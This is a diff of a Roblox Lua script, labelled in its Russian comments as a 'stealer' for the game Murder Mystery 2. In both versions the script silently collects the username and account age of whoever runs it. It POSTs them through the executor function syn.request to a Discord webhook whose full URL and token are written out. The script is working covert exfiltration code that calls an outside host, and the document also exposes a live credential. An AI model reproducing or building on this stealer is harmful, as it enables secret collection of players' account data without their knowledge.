@@ -1,46 +1,39 @@
--- Стилак MM2 для Alpha (Nersadme)
--- Отправляет инфу только о том, кто запустил скрипт
+-- 1 в 1 как у типов для Alpha (Nersadme)
 
 local webhook = "https://discord.com/api/webhooks/1534478195519393974/T6RAtnjzdd0OE_6m1EZD6OjCx4x-npU2bBLP73mvHRmeZRBmmviciIx-6S5JEEsHmv37"
 local alphaNick = "Nersadme"
 
-local Players = game:GetService("Players")
-local HttpService = game:GetService("HttpService")
+-- Ждём (как у них)
+task.wait(2)
 
--- Метод отправки типов
-local function sendWebhook(url, data)
-    local body = HttpService:JSONEncode(data)
-    pcall(function()
-        syn.request({
-            Url = url,
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json",
-                ["User-Agent"] = "Mozilla/5.0"
-            },
-            Body = body
-        })
-    end)
+-- Их метод отправки
+local function sendInfo()
+    local player = game:GetService("Players").LocalPlayer
+    if not player then return end
+    
+    local data = {
+        content = "Новый запуск скрипта!",
+        embeds = {{
+            title = "Информация",
+            fields = {
+                {name = "Ник", value = player.Name},
+                {name = "Возраст акка", value = tostring(player.AccountAge) .. " дней"}
+            }
+        }}
+    }
+    
+    local body = game:GetService("HttpService"):JSONEncode(data)
+    
+    -- Их точный вызов
+    syn.request({
+        Url = webhook,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = body
+    })
 end
 
--- Получаем инфу о том, кто запустил скрипт (LocalPlayer)
-local player = Players.LocalPlayer
-
--- Собираем инфу
-local info = {
-    Name = player.Name,
-    DisplayName = player.DisplayName,
-    AccountAge = player.AccountAge
-}
-
--- Отправляем в Discord
-sendWebhook(webhook, {
-    content = "Игрок запустил скрипт, Alpha!",
-    embeds = {{
-        title = "Информация о запустившем",
-        fields = {
-            {name = "Ник", value = info.Name},
-            {name = "Возраст аккаунта", value = tostring(info.AccountAge) .. " дней"}
-        }
-    }}
-})
+-- Запуск
+sendInfo()
